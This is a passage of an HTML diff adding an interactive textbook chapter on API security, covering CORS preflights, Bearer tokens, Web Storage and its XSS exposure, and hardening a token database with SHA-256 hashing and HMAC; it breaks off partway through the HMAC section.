+  <p>The trouble is that everything that made cookies <em>convenient</em> &mdash; the browser handling them automatically and scoping them tightly to one site &mdash; is exactly what makes them <em>awkward</em> the moment you cross a domain boundary or leave the browser entirely.</p>
+
+  <div class="draw">
+    <div class="di"><div class="ic2">&#127760;</div><div><b>A second domain can't talk to the API.</b><p>The new <code>nat.tr</code> site is a different origin, so the same-origin policy blocks its JSON login requests, throws away any <code>Set-Cookie</code> header on the response, and hides the anti-CSRF token. Three separate roadblocks.</p></div></div>
+    <div class="di"><div class="ic2">&#128241;</div><div><b>Native apps don't love cookies.</b><p>Mobile and desktop apps have to manage cookies manually &mdash; the automatic browser machinery isn't there. Cookies feel unnatural outside the browser.</p></div></div>
+    <div class="di"><div class="ic2">&#128683;</div><div><b>The web is turning against cross-site cookies.</b><p>SameSite cookies are fundamentally incompatible with cross-site CORS, and browsers from Apple, Google, and Mozilla are increasingly blocking cross-site cookies for privacy. The writing is on the wall.</p></div></div>
+  </div>
+
+  <p>The plan for this chapter is to outgrow cookies in three deliberate moves: first <strong>relax the same-origin policy</strong> with CORS so other domains can call the API at all; then <strong>replace cookies entirely</strong> with the Bearer scheme and Web Storage; and finally <strong>harden the database</strong> that now has to store those tokens ourselves.</p>
+</section>
+
+<hr class="rule">
+
+<!-- ===================== 2 ===================== -->
+<section id="cors">
+  <div class="sec-head"><span class="sec-num">2</span><div><h2>Cross-origin requests and CORS</h2></div></div>
+  <p class="lead">Recall from chapter 4 that the same-origin policy lets a request be <em>sent</em> cross-origin but usually blocks the script from <em>reading</em> the response &mdash; and outright blocks "non-simple" requests (like JSON <code>POST</code>s). <em class="term">CORS</em> is the standard, introduced in 2013, that lets a server selectively opt back in to some of those blocked requests.</p>
+
+  <div class="callout def">
+    <svg class="ic" viewBox="0 0 24 24" fill="none" stroke="#1d6b5a" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M2 12h20M12 2a15 15 0 0 1 0 20 15 15 0 0 1 0-20z"/></svg>
+    <span class="lab">Definition · CORS</span>
+    <p><strong>Cross-Origin Resource Sharing (CORS)</strong> is a standard that allows certain cross-origin requests to be permitted by web browsers. It defines a set of HTTP headers an API can return to tell the browser which cross-origin requests it should allow &mdash; and how much of the response the calling script may read.</p>
+  </div>
+
+  <p>The mental shift is this: with CORS, the <em>server</em> gets a say. Before CORS, the browser simply blocked anything that violated the SOP. Now, when a request would have been blocked, the browser first <em>asks the target server</em> whether it's allowed &mdash; via a preflight request &mdash; and only proceeds if the server says yes.</p>
+</section>
+
+<hr class="rule">
+
+<!-- ===================== 3 ===================== -->
+<section id="preflight">
+  <div class="sec-head"><span class="sec-num">3</span><div><h2>The preflight handshake</h2></div></div>
+  <p class="lead">The heart of CORS is the <em class="term">preflight request</em>. Before sending a "non-simple" cross-origin request, the browser quietly sends an <code>OPTIONS</code> request to the target server, describing what it's <em>about</em> to do and asking permission. Only if the server approves does the real request go out.</p>
+
+  <div class="callout def">
+    <svg class="ic" viewBox="0 0 24 24" fill="none" stroke="#1d6b5a" stroke-width="2"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><path d="m9 11 3 3L22 4"/></svg>
+    <span class="lab">Definition · Preflight request</span>
+    <p>A <strong>preflight request</strong> is an automatic HTTP <code>OPTIONS</code> request the browser sends before a cross-origin request that would otherwise violate the SOP. It carries the <code>Origin</code>, the intended method (<code>Access-Control-Request-Method</code>), and any non-standard headers (<code>Access-Control-Request-Headers</code>). The server replies allowing or denying the real request.</p>
+  </div>
+
+  <!-- INTERACTIVE DIAGRAM 1 : preflight handshake -->
+  <div class="diagram" id="dg-preflight">
+    <div class="dlabel">Interactive · Figure 5.2</div>
+    <div class="dtitle">How a CORS preflight decides yes or no</div>
+    <p class="dhint"><b>Step through the handshake</b>, then flip the outcome to see what happens when the server <em>approves</em> versus when it <em>refuses</em>.</p>
+
+    <div style="display:grid;grid-template-columns:auto 1fr auto;gap:14px;align-items:center">
+      <div class="node pf" data-pf="browser" style="text-align:center;padding:16px;font-weight:700;font-size:13px;border-color:var(--accent-2);width:120px">&#127760;<br>Browser<br><small style="font-weight:400;font-family:var(--mono);font-size:8px;color:var(--ink-soft)">script @ nat.tr</small></div>
+      <div style="text-align:center;min-height:90px;display:flex;flex-direction:column;justify-content:center;gap:6px" id="pf-mid">
+        <div style="font-family:var(--mono);font-size:11px;color:var(--ink-soft)">tap a step below</div>
+      </div>
+      <div class="node pf" data-pf="api" style="text-align:center;padding:16px;font-weight:700;font-size:13px;border-color:var(--accent);width:120px">&#9881;<br>API server<br><small style="font-weight:400;font-family:var(--mono);font-size:8px;color:var(--ink-soft)">api.example.com</small></div>
+    </div>
+
+    <div class="stepper" id="pf-steps">
+      <button onclick="pfStep(0,this)" class="active">Overview</button>
+      <button onclick="pfStep(1,this)">1 · OPTIONS</button>
+      <button onclick="pfStep(2,this)">2 · Server replies</button>
+      <button onclick="pfStep(3,this)">3a · Allowed</button>
+      <button onclick="pfStep(4,this)">3b · Blocked</button>
+    </div>
+    <div class="step-readout" id="pf-readout">When a script tries a cross-origin request the SOP would block, the browser first sends a preflight <code>OPTIONS</code> request asking permission. If the server's reply matches what the request needs, the real request proceeds; otherwise the browser blocks it. Step through to see both outcomes.</div>
+  </div>
+
+  <div class="dexplain">
+    <h4>Reading the diagram</h4>
+    <p>The key thing to internalise is that the preflight is a <i>separate</i> request the browser makes <i>on your script's behalf</i>, before the one you actually wrote.</p>
+    <ol>
+      <li><b>The OPTIONS preflight.</b> The browser sends <code>OPTIONS</code> to the target, including the <code>Origin</code> (who's asking), the method it intends to use, and any custom headers it wants to send.</li>
+      <li><b>The server replies.</b> It returns CORS headers describing what it permits &mdash; which origins, methods, and headers are acceptable.</li>
+      <li><b>Allowed:</b> if the server's response covers what the request needs, the browser sends the <i>real</i> request and lets the script read the response.</li>
+      <li><b>Blocked:</b> if the server sends no CORS headers, or they don't match, the browser refuses &mdash; and your script sees only a cryptic "blocked by CORS policy" error, never the response.</li>
+    </ol>
+    <p style="margin-top:10px">Because preflights never carry credentials, you must handle them <b>before</b> authentication in your filter chain &mdash; otherwise every preflight would fail authentication and the real request would never happen.</p>
+  </div>
+</section>
+
+<hr class="rule">
+
+<!-- ===================== 4 ===================== -->
+<section id="headers">
+  <div class="sec-head"><span class="sec-num">4</span><div><h2>The CORS response headers</h2></div></div>
+  <p class="lead">CORS is really just a small vocabulary of response headers. The server uses them to answer the browser's "may I?" with precise terms. Two of them can appear on both the preflight and the real response; the rest only make sense on the preflight. Here's the whole set, with where each one belongs.</p>
+
+  <div class="hdrtbl">
+    <div class="hrow hhead"><div class="hk">Header</div><div class="hv">Scope &amp; purpose</div></div>
+    <div class="hrow"><div class="hk">Access-Control-Allow-Origin</div><div class="hv"><span class="scopepill both">BOTH</span> One specific allowed origin, or <code>*</code> for any. Can't be <code>*</code> if credentials are allowed.</div></div>
+    <div class="hrow"><div class="hk">Access-Control-Allow-Headers</div><div class="hv"><span class="scopepill pre">PREFLIGHT</span> Which non-simple request headers are permitted (or <code>*</code>).</div></div>
+    <div class="hrow"><div class="hk">Access-Control-Allow-Methods</div><div class="hv"><span class="scopepill pre">PREFLIGHT</span> Which HTTP methods are permitted (or <code>*</code>).</div></div>
+    <div class="hrow"><div class="hk">Access-Control-Allow-Credentials</div><div class="hv"><span class="scopepill both">BOTH</span> Whether the browser may send credentials (cookies, saved passwords, client certs). If <code>true</code>, no header may use <code>*</code>.</div></div>
+    <div class="hrow"><div class="hk">Access-Control-Max-Age</div><div class="hv"><span class="scopepill pre">PREFLIGHT</span> How many seconds to cache this preflight result. Browsers cap it (Chrome ~10 min).</div></div>
+    <div class="hrow"><div class="hk">Access-Control-Expose-Headers</div><div class="hv"><span class="scopepill act">ACTUAL</span> Which non-basic response headers the script is allowed to read.</div></div>
+  </div>
+
+  <div class="callout tip">
+    <svg class="ic" viewBox="0 0 24 24" fill="none" stroke="#2f4858" stroke-width="2"><path d="M9 11l3 3L22 4M21 12v7a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11"/></svg>
+    <span class="lab">The single-origin gotcha</span>
+    <p><code>Access-Control-Allow-Origin</code> accepts only <em>one</em> value, not a list. So to support several origins, your server keeps an allow-list, compares the request's <code>Origin</code> against it, and <strong>echoes back the exact match</strong>. That's safe here &mdash; unlike the header-reflection risks from chapter 2 &mdash; precisely because you only reflect after an exact equality check against trusted origins. Always pair it with <code>Vary: Origin</code> so caches don't serve one origin's response to another.</p>
+  </div>
+
+  <p>For Natter, the CORS filter runs as the very first thing after rate-limiting (and before authentication, since preflights carry no credentials). It checks the <code>Origin</code> against an allow-list, sets the basic headers when it matches, and short-circuits preflights with a <code>204 No Content</code> (or <code>403</code> if the origin isn't allowed).</p>
+
+  <div class="code">
+    <div class="bar"><span class="dot" style="background:#ff5f56"></span><span class="dot" style="background:#ffbd2e"></span><span class="dot" style="background:#27c93f"></span><span class="t">CorsFilter.java &mdash; the heart of the filter</span></div>
+<pre><span class="kw">var</span> origin = request.headers(<span class="st">"Origin"</span>);
+<span class="kw">if</span> (origin != <span class="kw">null</span> &amp;&amp; allowedOrigins.contains(origin)) {   <span class="cm">// exact match against allow-list</span>
+  response.header(<span class="st">"Access-Control-Allow-Origin"</span>, origin);    <span class="cm">// echo it back</span>
+  response.header(<span class="st">"Access-Control-Allow-Credentials"</span>, <span class="st">"true"</span>);
+  response.header(<span class="st">"Vary"</span>, <span class="st">"Origin"</span>);                          <span class="cm">// caches must key on Origin</span>
+}
+<span class="kw">if</span> (isPreflightRequest(request)) {
+  <span class="kw">if</span> (origin == <span class="kw">null</span> || !allowedOrigins.contains(origin)) halt(<span class="nm">403</span>);
+  response.header(<span class="st">"Access-Control-Allow-Headers"</span>, <span class="st">"Content-Type, Authorization, X-CSRF-Token"</span>);
+  response.header(<span class="st">"Access-Control-Allow-Methods"</span>, <span class="st">"GET, POST, DELETE"</span>);
+  halt(<span class="nm">204</span>);   <span class="cm">// preflight handled — no body needed</span>
+}</pre>
+  </div>
+
+  <div class="callout danger">
+    <svg class="ic" viewBox="0 0 24 24" fill="none" stroke="#b5471f" stroke-width="2"><path d="M10.3 3.9 1.8 18a2 2 0 0 0 1.7 3h17a2 2 0 0 0 1.7-3L13.7 3.9a2 2 0 0 0-3.4 0z"/><path d="M12 9v4m0 4h.01"/></svg>
+    <span class="lab">CORS and SameSite cookies fundamentally clash</span>
+    <p>If a cookie is <code>SameSite</code>, it is <strong>never</strong> sent on a genuine cross-site request &mdash; CORS or no CORS, the <code>Access-Control-Allow-Credentials</code> header is simply ignored. (Sub-domains of the same site are the one exception.) So you can't have both cross-site cookies <em>and</em> SameSite protection. With browsers now defaulting cookies to <code>SameSite=lax</code> and aggressively blocking cross-site cookies for privacy, this is the clearest sign yet that cookies aren't the future for cross-origin APIs &mdash; which is exactly why we move on.</p>
+  </div>
+</section>
+
+<hr class="rule">
+
+<!-- ===================== 5 ===================== -->
+<section id="pillars">
+  <div class="sec-head"><span class="sec-num">5</span><div><h2>What cookies quietly gave us for free</h2></div></div>
+  <p class="lead">Before we tear cookies out, it's worth appreciating exactly what they were doing. Cookies are seductive because they bundle <em>three</em> separate jobs of token-based authentication into one neat package the browser manages for you. To replace cookies, we have to rebuild all three &mdash; and that's the roadmap for the rest of the chapter.</p>
+
+  <!-- INTERACTIVE DIAGRAM 2 : three pillars -->
+  <div class="diagram" id="dg-pillars">
+    <div class="dlabel">Interactive · Figures 5.3 &amp; 5.4</div>
+    <div class="dtitle">The three jobs cookies do &mdash; and their replacements</div>
+    <p class="dhint"><b>Tap each pillar</b> to see what cookies provided and what we'll swap in. By the end of the chapter, all three columns are replaced.</p>
+
+    <div class="pillars">
+      <div class="pil pl" data-pl="transport" onclick="pillarPick('transport',this)" style="cursor:pointer">
+        <div class="ic3">&#128228;</div>
+        <div class="sub2">Transport</div>
+        <h5>Cookie / Set-Cookie</h5>
+        <p>A standard way to pass the token between client and server.</p>
+        <div class="arrow2">&rarr; Bearer scheme</div>
+      </div>
+      <div class="pil pl" data-pl="clientstore" onclick="pillarPick('clientstore',this)" style="cursor:pointer">
+        <div class="ic3">&#128190;</div>
+        <div class="sub2">Client storage</div>
+        <h5>Cookie jar</h5>
+        <p>A place on the client to keep the token across page loads and reloads.</p>
+        <div class="arrow2">&rarr; Web Storage</div>
+      </div>
+      <div class="pil pl" data-pl="serverstore" onclick="pillarPick('serverstore',this)" style="cursor:pointer">
+        <div class="ic3">&#128451;</div>
+        <div class="sub2">Server storage</div>
+        <h5>Framework sessions</h5>
+        <p>Server-side state, handled automatically by the web framework.</p>
+        <div class="arrow2">&rarr; Database token store</div>
+      </div>
+    </div>
+    <div class="step-readout" id="pillar-readout">Cookies rolled three jobs into one: <b>transport</b> (how the token travels), <b>client storage</b> (where the browser keeps it), and <b>server storage</b> (where the state lives). Tap each pillar to see its cookie-free replacement.</div>
+  </div>
+
+  <div class="dexplain">
+    <h4>Reading the diagram</h4>
+    <p>Seeing these as three <i>separate</i> responsibilities is the key insight &mdash; it's why replacing cookies takes three distinct pieces of work rather than one.</p>
+    <ol>
+      <li><b>Transport.</b> Cookies travelled via the automatic <code>Cookie</code>/<code>Set-Cookie</code> headers. We replace this with the standard <b>Bearer</b> scheme: the token rides in the <code>Authorization</code> header instead.</li>
+      <li><b>Client storage.</b> Cookies lived in the browser's cookie jar. We replace this with the <b>Web Storage API</b> (<code>localStorage</code>), which holds the token across reloads and restarts.</li>
+      <li><b>Server storage.</b> The framework persisted session state for us. We replace this with our own <b>database token store</b> &mdash; which also means we now own the job of generating, hashing, and expiring tokens securely.</li>
+    </ol>
+    <p style="margin-top:10px">There's an upside to losing cookies' automatic behaviour: because the browser no longer attaches the token by itself, <b>CSRF attacks largely vanish</b>. We trade one class of problem for another.</p>
+  </div>
+</section>
+
+<hr class="rule">
+
+<!-- ===================== 6 ===================== -->
+<section id="dbstore">
+  <div class="sec-head"><span class="sec-num">6</span><div><h2>Storing token state in a database</h2></div></div>
+  <p class="lead">Once we abandon cookies, we lose the framework's free server-side storage, so we build our own. A token is a wonderfully simple thing &mdash; an ID, the user it belongs to, an expiry, and a bag of attributes &mdash; so a single database table does the job nicely.</p>
+
+  <div class="code">
+    <div class="bar"><span class="dot" style="background:#ff5f56"></span><span class="dot" style="background:#ffbd2e"></span><span class="dot" style="background:#27c93f"></span><span class="t">schema.sql &mdash; the tokens table</span></div>
+<pre><span class="kw">CREATE TABLE</span> tokens(
+    token_id   <span class="fn">VARCHAR</span>(<span class="nm">100</span>) <span class="kw">PRIMARY KEY</span>,
+    user_id    <span class="fn">VARCHAR</span>(<span class="nm">30</span>) <span class="kw">NOT NULL</span>,        <span class="cm">-- who the token belongs to</span>
+    expiry     <span class="fn">TIMESTAMP</span> <span class="kw">NOT NULL</span>,
+    attributes <span class="fn">VARCHAR</span>(<span class="nm">4096</span>) <span class="kw">NOT NULL</span>       <span class="cm">-- everything else, as a JSON string</span>
+);
+<span class="kw">GRANT</span> SELECT, INSERT, DELETE <span class="kw">ON</span> tokens <span class="kw">TO</span> natter_api_user;</pre>
+  </div>
+  <p class="codecap">The indexed columns (<code>token_id</code>, <code>user_id</code>, <code>expiry</code>) are the ones you'll search by; the variable <b>attributes</b> bag is just serialized JSON, which avoids a sprawling schema for rarely-queried fields.</p>
+
+  <p>The single most important security decision here is <em>how you generate the token ID</em>. It is incredibly tempting to use a database sequence &mdash; but those are predictable, usually just an incrementing integer. An attacker could simply wait for someone to log in and then guess the next ID to hijack their session. Token IDs must be <strong>unguessable</strong>, which means generating them from a cryptographically secure random source.</p>
+
+  <div class="callout def">
+    <svg class="ic" viewBox="0 0 24 24" fill="none" stroke="#1d6b5a" stroke-width="2"><path d="M12 2v4m0 12v4m10-10h-4M6 12H2m15.07-7.07-2.83 2.83M9.76 14.24l-2.83 2.83m0-10.14 2.83 2.83m4.48 4.48 2.83 2.83"/></svg>
+    <span class="lab">Definition · Entropy</span>
+    <p><strong>Entropy</strong> measures how hard a value is to guess. A value with <strong>128 bits of entropy</strong> has a 1-in-2<sup>128</sup> chance of being any particular value &mdash; a secure minimum for long-lived secrets. Natter uses <strong>160 bits</strong>: 20 bytes from a <code>SecureRandom</code>, then URL-safe Base64-encoded into a string.</p>
+  </div>
+
+  <div class="callout tip">
+    <svg class="ic" viewBox="0 0 24 24" fill="none" stroke="#2f4858" stroke-width="2"><path d="M12 2 4 6v6c0 5 3.5 8 8 10 4.5-2 8-5 8-10V6z"/></svg>
+    <span class="lab">Myth-busting · you can't "run out" of entropy</span>
+    <p>A persistent myth says the OS can exhaust its randomness if you read too much, tempting developers into dangerous home-grown workarounds. Not so. Once the OS has gathered ~256 bits of entropy at startup, it can generate strong random data essentially forever. Use <code>SecureRandom</code> (Java), or read <code>/dev/urandom</code> &mdash; never <code>/dev/random</code>, which can block for no security benefit. <strong>Trust the OS; don't roll your own.</strong></p>
+  </div>
+
+  <p>The <code>DatabaseTokenStore</code> then just inserts the random ID with the JSON-serialized attributes on <code>create</code>, runs a simple query on <code>read</code>, and a <code>DELETE</code> on <code>revoke</code>. There's also housekeeping: a scheduled task runs <code>DELETE FROM tokens WHERE expiry &lt; current_timestamp</code> every few minutes to stop the table growing forever (which would itself become a DoS vector), backed by an index on the <code>expiry</code> column to keep it fast.</p>
+
+  <div class="callout tip">
+    <svg class="ic" viewBox="0 0 24 24" fill="none" stroke="#2f4858" stroke-width="2"><circle cx="12" cy="12" r="9"/><path d="M12 7v5l3 3"/></svg>
+    <span class="lab">Which database? It depends.</span>
+    <p>A SQL database is fine for demos and low traffic, but tokens are validated on <em>every</em> request, so the per-lookup cost adds up. Because tokens are structurally simple and rarely change after issuance, many production systems reach for a fast key-value store like <strong>Redis</strong> or a NoSQL store instead. Whatever you choose, insist on one consistency guarantee: <strong>token deletion must stick.</strong> A revoked token must never flicker back to life due to a replication glitch.</p>
+  </div>
+</section>
+
+<hr class="rule">
+
+<!-- ===================== 7 ===================== -->
+<section id="bearer">
+  <div class="sec-head"><span class="sec-num">7</span><div><h2>The Bearer authentication scheme</h2></div></div>
+  <p class="lead">With cookies gone, how does the token travel? Reusing the old <code>X-CSRF-Token</code> header would work but feels wrong &mdash; it has nothing to do with CSRF anymore. There's a proper standard for exactly this: the <strong>Bearer</strong> scheme (RFC 6750). Born in OAuth2, it's now the universal way to send a token to an API.</p>
+
+  <div class="callout def">
+    <svg class="ic" viewBox="0 0 24 24" fill="none" stroke="#1d6b5a" stroke-width="2"><rect x="3" y="8" width="18" height="12" rx="2"/><path d="M7 8V6a5 5 0 0 1 10 0v2"/></svg>
+    <span class="lab">Definition · Bearer token</span>
+    <p>A <strong>bearer token</strong> is one that authorizes <em>anyone who holds it</em> &mdash; no further proof of identity needed. That makes it easy to delegate access to a third party, but equally easy for an attacker to use if stolen. Like cash: whoever bears it, spends it. The token simply rides in the <code>Authorization</code> header: <code>Authorization: Bearer QDAmQ9TSt&hellip;</code></p>
+  </div>
+
+  <p>The Bearer scheme is more than just a header name &mdash; it also restores standards-compliance to Natter. Recall that in chapter 4 we had to strip out the <code>WWW-Authenticate</code> header to stop the browser's ugly Basic-auth popup. The Bearer scheme gives us a proper challenge to send instead, and a standard way to tell the client <em>why</em> a token was rejected.</p>
+
+  <div class="code">
+    <div class="bar"><span class="dot" style="background:#ff5f56"></span><span class="dot" style="background:#ffbd2e"></span><span class="dot" style="background:#27c93f"></span><span class="t">A standard challenge for an expired token</span></div>
+<pre>HTTP/1.1 401 Unauthorized
+WWW-Authenticate: Bearer realm=<span class="st">"users"</span>,
+    error=<span class="st">"invalid_token"</span>,
+    error_description=<span class="st">"Token has expired"</span></pre>
+  </div>
+  <p class="codecap">The <code>realm</code> can point clients at different login endpoints (e.g. users vs admins); <code>invalid_token</code> tells the client to re-authenticate and retry.</p>
+
+  <p>The implementation is small: <code>validateToken</code> checks for an <code>Authorization</code> header starting with <code>"Bearer "</code>, strips that 7-character prefix, and looks the rest up. If it's missing or uses a different scheme, it's ignored so Basic auth still works at the login endpoint.</p>
+
+  <div class="code">
+    <div class="bar"><span class="dot" style="background:#ff5f56"></span><span class="dot" style="background:#ffbd2e"></span><span class="dot" style="background:#27c93f"></span><span class="t">TokenController.java &mdash; parsing a Bearer header</span></div>
+<pre><span class="kw">var</span> tokenId = request.headers(<span class="st">"Authorization"</span>);
+<span class="kw">if</span> (tokenId == <span class="kw">null</span> || !tokenId.startsWith(<span class="st">"Bearer "</span>)) {
+  <span class="kw">return</span>;                          <span class="cm">// not a Bearer token — leave Basic auth to work</span>
+}
+tokenId = tokenId.substring(<span class="nm">7</span>);     <span class="cm">// strip "Bearer " prefix</span>
+
+tokenStore.read(request, tokenId).ifPresent(token -> {
+  <span class="kw">if</span> (Instant.now().isBefore(token.expiry)) {
+    request.attribute(<span class="st">"subject"</span>, token.username);   <span class="cm">// valid → tag the request</span>
+    token.attributes.forEach(request::attribute);
+  } <span class="kw">else</span> {
+    response.header(<span class="st">"WWW-Authenticate"</span>,             <span class="cm">// expired → standard challenge</span>
+        <span class="st">"Bearer error=\"invalid_token\",error_description=\"Expired\""</span>);
+    halt(<span class="nm">401</span>);
+  }
+});</pre>
+  </div>
+</section>
+
+<hr class="rule">
+
+<!-- ===================== 8 ===================== -->
+<section id="webstorage">
+  <div class="sec-head"><span class="sec-num">8</span><div><h2>Web Storage &mdash; and the XSS trade-off it brings</h2></div></div>
+  <p class="lead">The final pillar to replace is client-side storage. HTML 5 gives us the <strong>Web Storage API</strong>, which is both far easier to use than cookies and offers far more room (cookies cap out around 4KB). It exposes two objects on <code>window</code>, and the choice between them matters.</p>
+
+  <div class="grid c2">
+    <div class="mini"><h5><code>localStorage</code></h5><p>Persists until explicitly deleted &mdash; survives browser restarts. Shared across all tabs from the same origin. The practical choice for auth tokens, so the user stays logged in.</p></div>
+    <div class="mini"><h5><code>sessionStorage</code></h5><p>Cleared when the tab closes, and <em>not</em> shared between tabs. Tidy, but it forces a fresh login in every new tab &mdash; usually too annoying for auth tokens.</p></div>
+  </div>
+
+  <p>The API is refreshingly simple compared to wrangling <code>document.cookie</code> &mdash; just <code>localStorage.setItem('token', t)</code> to save and <code>localStorage.getItem('token')</code> to read. And each origin gets its own private copy, so a script from <code>example.com</code> can never see <code>example.org</code>'s storage. Moving to Web Storage plus Bearer also lets us <strong>tighten CORS</strong>: since the browser no longer adds cookies automatically, we can drop <code>Access-Control-Allow-Credentials</code> entirely.</p>
+
+  <p>But every security decision is a trade-off, and this one has a sharp edge. A session cookie could be marked <code>HttpOnly</code> to hide it from JavaScript. <strong>Web Storage is, by design, only accessible from JavaScript</strong> &mdash; so that protection simply isn't available. This makes Web Storage more exposed to <em class="term">exfiltration</em> if you have an XSS flaw.</p>
+
+  <div class="callout def">
+    <svg class="ic" viewBox="0 0 24 24" fill="none" stroke="#1d6b5a" stroke-width="2"><path d="M14 3v4a1 1 0 0 0 1 1h4M5 12V5a2 2 0 0 1 2-2h7l5 5v4M5 16l3 3-3 3m4-3h6"/></svg>
+    <span class="lab">Definition · Exfiltration</span>
+    <p><strong>Exfiltration</strong> is stealing tokens or sensitive data from a page and quietly sending them to the attacker &mdash; without the victim noticing. The attacker then replays the stolen token to log in as the user from their own device.</p>
+  </div>
+
+  <!-- INTERACTIVE DIAGRAM 3 : XSS exfiltration vs proxy -->
+  <div class="diagram" id="dg-xss">
+    <div class="dlabel">Interactive · Figures 5.5 &amp; 5.6</div>
+    <div class="dtitle">Two ways an XSS attacker abuses a token</div>
+    <p class="dhint"><b>Toggle</b> between the two attack styles. The grim lesson: against a real XSS flaw, <em>neither</em> Web Storage nor HttpOnly cookies truly save you.</p>
+
+    <div class="stepper" id="xss-toggle">
+      <button onclick="xssMode('exfil',this)" class="active">&#128190; Exfiltrate (Web Storage)</button>
+      <button onclick="xssMode('proxy',this)">&#127760; Proxy through browser (cookies too)</button>
+    </div>
+    <div id="xss-view" style="margin-top:6px"></div>
+    <div class="step-readout" id="xss-readout">Web Storage is readable by JavaScript, so an XSS script can steal tokens directly. But even HttpOnly cookies aren't safe &mdash; the attacker can just ride the victim's session from inside their browser. Toggle to compare.</div>
+  </div>
+
+  <div class="dexplain">
+    <h4>Reading the diagram</h4>
+    <p>The point of showing both is to puncture a comforting myth: that <code>HttpOnly</code> cookies "solve" XSS. They raise the bar, but they don't close the door.</p>
+    <ol>
+      <li><b>Exfiltration (Web Storage).</b> Because <code>localStorage</code> is readable from JavaScript, an injected script loops over it and ships every token to the attacker's server &mdash; classically by creating <code>&lt;img&gt;</code> tags whose <code>src</code> URL carries the token. Browsers load image URLs eagerly, even without adding the element to the page, so the theft is silent.</li>
+      <li><b>Proxy through the browser (works against cookies too).</b> If the token is locked in an <code>HttpOnly</code> cookie and can't be read, the attacker doesn't bother &mdash; they simply make the malicious script issue the requests <i>from inside the victim's browser</i>. The browser attaches the cookie automatically, the requests look same-origin, and CSRF defences don't help. Tools like BeEF automate exactly this.</li>
+    </ol>
+    <p style="margin-top:10px">The honest takeaway: there is <b>no reasonable defence if an attacker can run script on your page</b>. Preventing XSS in the first place (chapter 2) must come first; <code>Content-Security-Policy</code> and Trusted Types are strong hardening layers on top.</p>
+  </div>
+</section>
+
+<hr class="rule">
+
+<!-- ===================== 9 ===================== -->
+<section id="harden">
+  <div class="sec-head"><span class="sec-num">9</span><div><h2>Hardening the token database</h2></div></div>
+  <p class="lead">We now own a database full of live tokens &mdash; effectively a drawer of working keys to every logged-in account. If an attacker reaches that database (via SQL injection or direct access), the damage dwarfs stealing one user's token. We harden it in layers, each blunting a different kind of access.</p>
+
+  <p>First, frame the threat precisely. An attacker who breaches the token store gains one of three capabilities, and each is harmful in its own way.</p>
+
+  <!-- INTERACTIVE DIAGRAM 4 : DB threats -->
+  <div class="diagram" id="dg-threats">
+    <div class="dlabel">Interactive · Figure 5.7</div>
+    <div class="dtitle">Three ways a breached token database hurts you</div>
+    <p class="dhint"><b>Tap each access type</b> to see the specific damage &mdash; and which hardening layer addresses it.</p>
+
+    <div class="threats3">
+      <div class="th read tcard" data-t="read" onclick="threatPick('read',this)" style="cursor:pointer"><h5>&#128065; Read access</h5><p>Steal tokens and replay them to impersonate any logged-in user.</p></div>
+      <div class="th write tcard" data-t="write" onclick="threatPick('write',this)" style="cursor:pointer"><h5>&#9999; Write access</h5><p>Inject fake tokens or escalate an existing token's privileges.</p></div>
+      <div class="th del tcard" data-t="del" onclick="threatPick('del',this)" style="cursor:pointer"><h5>&#128465; Delete access</h5><p>Revoke other users' tokens, locking them out &mdash; a denial of service.</p></div>
+    </div>
+    <div class="step-readout" id="threat-readout">Even with TLS protecting the API-to-database link, a breach gives the attacker read, write, or delete power &mdash; each with its own consequences. Tap each to see the matching defence.</div>
+  </div>
+
+  <div class="dexplain">
+    <h4>Reading the diagram &mdash; and the layered defences</h4>
+    <p>We don't rely on a single wall. We stack defences so a breach of one capability is still contained:</p>
+    <ol>
+      <li><b>Read access</b> &rarr; defeated by <b>hashing tokens</b> (next). The stored value is a one-way hash, so stolen rows can't be replayed.</li>
+      <li><b>Write access</b> &rarr; defeated by <b>HMAC authentication tags</b> (section 10). Without the secret key, an attacker can't forge a token the API will accept.</li>
+      <li><b>Delete access</b> &rarr; mitigated by <b>least-privilege database accounts</b> and <b>row-level security</b> &mdash; separate accounts for queries vs bulk deletes, so an injection through the query path can't wipe the table.</li>
+    </ol>
+  </div>
+
+  <h3>Layer one: hash the stored tokens</h3>
+  <p>A token is a credential, just like a password &mdash; so just as we hashed passwords in chapter 3, we hash tokens. The crucial difference: tokens already have high entropy (they're random), so we don't need a slow algorithm like Scrypt. A fast cryptographic hash like <strong>SHA-256</strong> is perfect. The client gets the original random ID; the database stores only its SHA-256 hash. Steal the database and you get hashes that can't be reversed into usable tokens.</p>
+
+  <div class="stack">
+    <div class="layer" onclick="stackPick(0,this)"><div class="lnum">1</div><div><h5>Separate the database from the API</h5><p>Don't expose the DB to external clients; secure the API-to-DB link with TLS. The baseline.</p></div></div>
+    <div class="layer on" onclick="stackPick(1,this)"><div class="lnum">2</div><div><h5>Hash tokens (SHA-256)</h5><p>Store only the hash. Read access yields useless hashes, not live tokens.</p></div></div>
+    <div class="layer" onclick="stackPick(2,this)"><div class="lnum">3</div><div><h5>Authenticate with HMAC</h5><p>Append a keyed tag so forged or tampered tokens are rejected before any DB lookup.</p></div></div>
+    <div class="layer" onclick="stackPick(3,this)"><div class="lnum">4</div><div><h5>Least privilege &amp; row-level security</h5><p>Split DB accounts (CQRS), restrict rows per user &mdash; contain what any single breach can touch.</p></div></div>
+  </div>
+  <div class="step-readout" id="stack-readout" style="margin-top:0">Layer 2 highlighted: <b>hashing</b> protects against read access. Tap any layer above to see how it fits the defence-in-depth stack.</div>
+</section>
+
+<hr class="rule">
+
+<!-- ===================== 10 ===================== -->
+<section id="hmac">
+  <div class="sec-head"><span class="sec-num">10</span><div><h2>Authenticating tokens with HMAC</h2></div></div>
+  <p class="lead">Hashing stops a thief <em>reading</em> usable tokens, but it does nothing against an attacker with <em>write</em> access &mdash; they can just insert their own token row and use it. The fix is to make every valid token carry proof that <em>your server</em> created it, using a secret only your server knows. That proof is a <em class="term">message authentication code</em>, and the standard one is <strong>HMAC</strong>.</p>
+
+  <div class="callout def">
+    <svg class="ic" viewBox="0 0 24 24" fill="none" stroke="#1d6b5a" stroke-width="2"><path d="M12 2 4 6v6c0 5 3.5 8 8 10 4.5-2 8-5 8-10V6z"/><path d="m9 12 2 2 4-4"/></svg>
+    <span class="lab">Definition · MAC and HMAC</span>
